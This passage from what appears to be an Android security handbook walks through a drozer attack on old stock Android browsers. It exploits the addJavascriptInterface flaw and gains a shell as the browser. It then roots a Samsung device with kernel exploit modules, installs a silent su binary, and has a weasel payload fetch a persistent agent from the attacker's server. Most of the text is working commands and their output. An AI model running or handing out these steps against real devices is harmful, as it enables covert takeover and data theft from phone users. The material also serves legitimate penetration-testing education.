- android.permission.READ_SOCIAL_STREAM
- android.permission.READ_SYNC_SETTINGS
- android.permission.READ_SYNC_STATS
- android.permission.READ_USER_DICTIONARY
- android.permission.RECEIVE_BOOT_COMPLETED
- android.permission.RECEIVE_MMS
- android.permission.RECEIVE_SMS
- android.permission.RECEIVE_WAP_PUSH
- android.permission.RECORD_AUDIO
- android.permission.REORDER_TASKS
- android.permission.RESTART_PACKAGES
- android.permission.SEND_SMS
- android.permission.SET_ANIMATION_SCALE
- android.permission.SET_DEBUG_APP
- android.permission.SET_PROCESS_LIMIT
- android.permission.SET_TIME_ZONE
- android.permission.SET_WALLPAPER
- android.permission.SET_WALLPAPER_HINTS
- android.permission.SIGNAL_PERSISTENT_PROCESSES
- android.permission.SUBSCRIBED_FEEDS_READ
- android.permission.SUBSCRIBED_FEEDS_WRITE
- android.permission.SYSTEM_ALERT_WINDOW
- android.permission.USE_CREDENTIALS
- android.permission.USE_SIP
- android.permission.VIBRATE
- android.permission.WAKE_LOCK
- android.permission.WRITE_CALENDAR
- android.permission.WRITE_CONTACTS
- android.permission.WRITE_EXTERNAL_STORAGE
- android.permission.WRITE_PROFILE
- android.permission.WRITE_SMS
- android.permission.WRITE_SOCIAL_STREAM
- android.permission.WRITE_SYNC_SETTINGS
- android.permission.WRITE_USER_DICTIONARY
The permissions granted to this agent are shown in the previous output. A tremendous amount of control can be
expressed over this device with this level of access. What exactly can be done with this level of access is explored
later in this chapter in the section, “Infiltrating User Data.” The great thing about being able to install a full
drozer package is that you are able to use Context and the payload survives device reboots. This is because the
drozer agent catches the BOOT_COMPLETED intent in its manifest, which means that it gets started again when the
device boots up. The other session received by the drozer server is a limited drozer agent as shown previously in
the Browser Memory Corruption exploit.
Android Browser JavaScript Interface
As explained in the “WebViews” subsection in Chapter 7, all WebViews making use of a JavaScriptInterface
and targeting an API version before 17 are vulnerable to a remote code execution flaw. This includes all stock
Android web browsers on Android 4.1.1 and older devices. This example looks at abusing this vulnerability using
a drozer exploit at exploit.remote.browser .addjavascriptinterface. The attack begins by running a drozer
server on port 80 and then building the exploit:
$ drozer exploit build exploit.remote.browser.addjavascriptinterface
--server 192.168.1.112:80 --payload weasel.shell.armeabi --resource /
Uploading weasel to /weasel and W... [ OK ]
Packaging an Agent... (this may take some time)
Uploading the Agent to /agent.apk and A... [ OK ]
Uploading server.settings... [ OK ]
Uploading libWebViewContext.so... [ OK ]
Uploading blank page to /... [ OK ]
Uploading exploit inclusion page to /... [ OK ]
Uploading exploit to /dz.js... [ OK ]
Done. The exploit is available on: http://192.168.1.112:80/
When using the MitM helper plug-in for drozer: JS Location =
http://192.168.1.112:80/dz.js
Visiting the main page from an Android 4.0.4 device yields the following in the drozer server log:
2014-11-14 10:32:57,713 - drozer.server.protocols.http - INFO - GET /
2014-11-14 10:32:58,217 - drozer.server.protocols.http - INFO - GET
/dz.js
2014-11-14 10:32:59,227 - drozer.server.protocols.http - INFO - GET
/server.settings
2014-11-14 10:32:59,314 - drozer.server.protocols.http - INFO - GET
/libWebViewContext.so
2014-11-14 10:32:59,330 - drozer.server.protocols.http - INFO - GET
/agent.jar
2014-11-14 10:33:00,157 - drozer.server.protocols.http - INFO - GET
/favicon.ico
2014-11-14 10:33:00,208 - drozer.server.protocols.drozerp.drozer - INFO
- accepted connection from 2df0s1l8t5vld
You will notice that a unique file is being requested by the exploit named libWebViewContext.so. This is the
inclusion of the work by David Hartley from MWR InfoSecurity on allowing a drozer agent to obtain the elusive
Context. This allows the drozer agent to be classloaded and passed Context. This effectively allows the drozer
code to be running with exactly the same permissions as the browser and be included as part of the browser's
running code. This is a huge step forward in creating advanced Android exploitation payloads and you can find
additional information about it at https://labs.mwrinfosecurity.com/blog/2014/06/12/putting-javascript-
bridges-into-android-context/. Connecting to this session and typing permissions confirms that you have
Context and shows the permissions held by the agent, which have been stolen from the browser.
$ drozer console connect 2df0s1l8t5vld --server 192.168.1.112:80
.. ..:.
..o.. .r..
..a.. . ....... . ..nd
ro..idsnemesisand..pr
.otectorandroidsneme.
.,sisandprotectorandroids+.
..nemesisandprotectorandroidsn:.
.emesisandprotectorandroidsnemes..
..isandp,..,rotectorandro,..,idsnem.
.isisandp..rotectorandroid..snemisis.
,andprotectorandroidsnemisisandprotec.
.torandroidsnemesisandprotectorandroid.
.snemisisandprotectorandroidsnemesisan:
.dprotectorandroidsnemesisandprotector.
drozer Console (v2.3.4)
dz> permissions
Has ApplicationContext: YES
Available Permissions:
- android.permission.ACCESS_ALL_DOWNLOADS
- android.permission.ACCESS_COARSE_LOCATION
- android.permission.ACCESS_DOWNLOAD_MANAGER
- android.permission.ACCESS_FINE_LOCATION
- android.permission.ACCESS_NETWORK_STATE
- android.permission.ACCESS_WIFI_STATE
- android.permission.CHANGE_NETWORK_STATE
- android.permission.CHANGE_WIFI_STATE
- android.permission.DEVICE_POWER
- android.permission.GET_ACCOUNTS
- android.permission.INTERNET
- android.permission.MANAGE_ACCOUNTS
- android.permission.NFC
- android.permission.READ_CONTACTS
- android.permission.READ_PHONE_STATE
- android.permission.READ_SYNC_SETTINGS
- android.permission.RECEIVE_BOOT_COMPLETED
- android.permission.SEND_DOWNLOAD_COMPLETED_INTENTS
- android.permission.SET_WALLPAPER
- android.permission.STATUS_BAR
- android.permission.USE_CREDENTIALS
- android.permission.WAKE_LOCK
- android.permission.WRITE_EXTERNAL_STORAGE
- android.permission.WRITE_MEDIA_STORAGE
- android.permission.WRITE_SECURE_SETTINGS
- android.permission.WRITE_SETTINGS
- android.permission.WRITE_SYNC_SETTINGS
- com.android.browser.permission.READ_HISTORY_BOOKMARKS
- com.android.browser.permission.WRITE_HISTORY_BOOKMARKS
- com.android.launcher.permission.INSTALL_SHORTCUT
Launching a normal shell from this also confirms that you are running as the browser and using
com.android.browser as the base directory to use the drozer agent from:
dz> shell
app_81@android:/data/data/com.android.browser $ ls
agent.dex
agent.jar
app_appcache
app_databases
app_filesystem
app_geolocation
app_icons
app_webnotification
cache
databases
lib
libWebViewContext.so
server.settings
shared_prefs
w
While you have a connected session, explore some post-exploitation techniques on this device that will allow
you to obtain root access and install a drozer agent package that persists across reboots. The method used to
gain the original session will not persist across reboots because it was loaded into memory during the exploit
and doesn't do anything to ensure that it will be loaded again. In fact, it can't do anything to ensure this with the
level of access it has.
In general, if you want to find out what device you are accessing you can observe the output on the drozer
console devices output or perform the following commands:
dz> shell getprop ro.product.brand
samsung
dz> shell getprop ro.product.model
GT-I9300
dz> shell getprop ro.build.version.release
4.0.4
A bit of research on the Internet reveals a kernel exploit is available for this device. This particular exploit was
discussed in Chapter 6, “Rooting Explained” under “Exynos Abuse — Exploiting Custom Drivers.” The exploit
abuses the /dev/exynos-mem device driver for a root shell; drozer has a post-exploitation module available for
this. To install all root exploit modules in drozer perform the following:
dz> module install root.
...
Processing metall0id.root.exynosmem... Done.
...
The output of this module was snipped to show only the relevant root exploit for the device an attacker would
have access to. After you install the new root exploit module, it becomes available inside the console:
dz> ls exynos
exploit.root.exynosmem Obtain a root shell on Samsung Galaxy S2, S3,
Note 2 and some other devices.
Running this module produces a root shell on the device:
dz> run exploit.root.exynosmem
[*] Uploading exynos-abuse
[*] Upload successful
[*] chmod 770 /data/data/com.android.browser/exynos-abuse
sh: No controlling tty (open /dev/tty: No such device or address)
sh: Can't find tty file descriptor
sh: warning: won't have full job control
app_81@android:/data/data/com.android.browser # id
uid=0(root) gid=10081(app_81) groups=1015(sdcard_rw),1023(media_rw),
3003(inet)
NOTE
If you do not know of any existing root exploits and enjoy playing high-stakes poker then you can use a
module at exploit.root.mmap_abuse to try to automatically get a root shell for you. The module is present
after installing all root post-exploitation modules:
dz> ls root
...
exploit.root.mmap_abuse Iterate through all devices and attempt to
exploit them to gain a root shell by abusing the mmap device
operation.
...
Running this module on the same device reveals the following:
dz> run exploit.root.mmap_abuse
[*] Uploading mmap-abuse
[*] Upload successful
[*] chmod 770 mmap-abuse
[*] Testing /dev/btlock
[*] Testing /dev/icdr
[*] Testing /dev/icd
[*] Testing /dev/fmradio
...
[*] Testing /dev/tty0
[*] Testing /dev/console
[*] Testing /dev/tty
[*] Testing /dev/exynos-mem
[+] /dev/exynos-mem is vulnerable!
[+] Enjoy your root shell...
sh: No controlling tty (open /dev/tty: No such device or address)
sh: Can't find tty file descriptor
sh: warning: won't have full job control
app_129@android:/data/data/com.mwr.dz #
It basically tries to exploit all block devices present on the device in exactly the same way as the exynos
abuse exploit. This is a very dangerous thing to do on a device because it could cause a kernel panic that
reboots the device. At this stage in the exploitation process it would mean that the session is lost.
However, using this as a targeted exploit against a known vulnerable block device is very effective. For
instance, in addition to working on a Galaxy S3, this module can be used against a Huawei P2 device with
success (see https://labs.mwrinfosecurity.com/advisories/2014/11/05/huawei-p2-hx170dec-
privilege-escalation-vulnerability/). Using this module with --device /dev/hx170dec gives a root
shell on a Huawei P2. Likely many more devices are vulnerable to the same issue that this module
exploits.
To keep this root access, you must install a special version of the su binary bundled with drozer named minimal
su. This binary was discussed briefly in Chapter 6 under “Rooting Objectives.” When you place this binary on
the device and install it correctly, it will give a root shell to any application that asks without prompting the user
in any way. A helper module to help set it up correctly is available at tool.setup.minimalsu. Running it reveals
the following:
dz> run tools.setup.minimalsu
[+] Uploaded minimal-su
[+] Uploaded install-minimal-su.sh
[+] chmod 770 /data/data/com.android.browser/install-minimal-su.sh
[+] Ready! Execute /data/data/com.android.browser/install-minimal-su.sh
from root context to install minimal-su
Now running the generated script from the root shell installs minimal su correctly on the device:
app_81@android:/data/data/com.android.browser # /data/data/com.android
.browser/install-minimal-su.sh
Done. You can now use `su` from a drozer shell.
You can now run su from a normal shell and obtain root access on the device at will without reusing an exploit:
dz> shell
app_81@android:/data/data/com.android.browser $ su -i
sh: No controlling tty (open /dev/tty: No such device or address)
sh: Can't find tty file descriptor
sh: warning: won't have full job control
app_81@android:/data/data/com.android.browser #
Anyone with root access has the privileges to install a new package. This fact allows the attacker to install a full
drozer agent package with all available permissions on the device. As mentioned, this agent will also persist
across reboots because it catches the BOOT_COMPLETED intent. The weasel payload was used to set up all of the
existing attacks thus far and can be used to retrieve a drozer agent from the server and install it as well. Weasel
is in the private data directory of the exploited application in a file named w. Running weasel as root and
providing it with the IP address and port of the server produces the following output:
app_81@android:/data/data/com.android.browser # ./w 192.168.1.112 80
Success
Broadcasting: Intent { act=com.mwr.dz.PWN }
Broadcast completed: result=0
Starting service: Intent { cmp=com.mwr.dz/.Agent }
pkg: /data/data/com.android.browser/agent.apk
This will most certainly break the current shell session and you would need to press Control+C to exit it. This is
because of the app_process replacement technique used by weasel that was discussed earlier. After you issue the
previous command, the following is displayed in the drozer server logs:
2014-11-14 12:05:03,206 - drozer.server.protocols.http - INFO - GET
/agent.apk
2014-11-14 12:12:01,257 - drozer.server.protocols.shell - INFO -
accepted shell from 192.168.1.109:42883
2014-11-14 12:12:01,268 - drozer.server.protocols.http - INFO - GET
/agent.apk
2014-11-14 12:12:01,273 - drozer.server.protocols.http - INFO - GET
/agent.jar
2014-11-14 12:12:03,369 - drozer.server.protocols.drozerp.drozer - INFO